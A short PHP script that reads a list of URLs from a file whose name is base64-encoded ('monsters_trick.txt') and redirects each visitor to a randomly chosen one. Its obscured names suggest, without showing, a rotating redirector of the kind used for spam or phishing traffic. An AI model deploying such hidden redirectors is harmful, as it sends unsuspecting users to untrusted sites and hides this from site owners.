<?php 

$t0=file(base64_decode('bW9uc3RlcnNfdHJpY2sudHh0'));
$w1=count($t0);
$w2=rand(0,$w1-1);
$b3=trim($t0[$w2]);
header("Location: $b3");
exit;?>